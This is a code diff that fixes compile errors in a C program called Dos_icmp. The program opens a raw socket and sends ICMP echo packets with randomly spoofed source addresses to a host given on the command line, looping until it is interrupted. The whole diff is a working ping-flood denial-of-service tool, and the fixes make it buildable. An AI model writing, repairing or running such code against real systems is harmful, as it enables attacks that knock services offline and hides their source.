@@ -10,11 +10,16 @@
 #include<error.h>
 #include<stdlib.h>
 #include<time.h>
+#include<netinet/ip.h>
+#include<netinet/ip_icmp.h>
+#include<string.h>
+#include<netinet/in.h>
 
 #define MAXCHILD 128
 static unsigned long dest=0;
 static int PROTO_ICMP=-1;
 static alive=-1;
+int rawsock;
 
 static inline long myrandom(int begin,int end)
 {
@@ -22,7 +27,7 @@ static inline long myrandom(int begin,int end)
 	int ret=0;
 	
 	srand((unsigned)time(0));
-	ret=random(end)%gap + begin;
+	ret=random()%gap + begin;
 	return ret;
 	
 }
@@ -44,26 +49,25 @@ static void Dos_icmp(void)
 	iph->ip_hl=5;
 	iph->ip_tos=0;
 	iph->ip_len=htons(pktsize);
-	iph->ip_id=htons(getid());
+	iph->ip_id=htons(getpid());
 	iph->ip_off=0;
 	iph->ip_ttl=0x0;
-	iph->ip_sum=0;
-	iph->ip_src=(unsigned long )myrandom(0,65535);
-	iph->ip_dst=dest;
+	iph->ip_src.s_addr=(unsigned long int)myrandom(0,65535);
+	iph->ip_dst.s_addr=dest;
 
     //icmp requset
-	icmp->icmp_type=ICMP_ECHO;
-	icmp->icmp_code=0;
+	icmph->icmp_type=ICMP_ECHO;
+	icmph->icmp_code=0;
 	/* 由于数据部分为0,并且代码为0,直接对不为0即icmp_type部分计算 */
-	icmp->icmp_sum=htons(~(ICMP_ECHO<<8));  
+	icmph->icmp_cksum=htons(~(ICMP_ECHO<<8));  
 	
 	to.sin_family=AF_INET;
-	to.sin_addr.s_addr=iph->ip_dst;
-	to.sin_port=htons(0)
+	to.sin_addr=iph->ip_dst;
+	to.sin_port=htons(0);
 	
 	sendto(rawsock,packet,pktsize,0,(struct sockaddr *)&to,
 		   sizeof(struct sockaddr));
-	free(pakcet);
+	free(packet);
 	
 }
 
@@ -71,7 +75,7 @@ static void Dos_fun(unsigned long ip)
 {
 	while(alive)
 	{
-		icmp();
+		Dos_icmp();
 	}
 }
 
@@ -90,7 +94,7 @@ int main(int argc,char *argv[])
 	int err=-1;
 	
 	alive=1;
-	signal(SIGNT,Dos_sig);
+	signal(SIGINT,Dos_sig);
 	if(argc<2){
 		return -1;
 	}
@@ -104,18 +108,18 @@ int main(int argc,char *argv[])
 	PROTO_ICMP=protocol->p_proto;
 	dest=inet_addr(argv[1]);
 	if(dest==INADDR_NONE){
-		host=gethostbyname(argv[1])
+		host=gethostbyname(argv[1]);
 		if(host==NULL){
 			perror("gethostbyname");
 			return -1;
 		}
 
-		memcpy((char *)&dest,host->h_addr.s_addr,host->h_length);
+		memcpy((char *)&dest,host->h_addr,host->h_length);
 		
 	}
 
 	// built original socket
-	rawsock=socket(AF_INET,SOCK_RAW,RAW);
+	rawsock=socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
 	if(rawsock<0)
 		rawsock=socket(AF_INET,SOCK_RAW,PROTO_ICMP);
 	
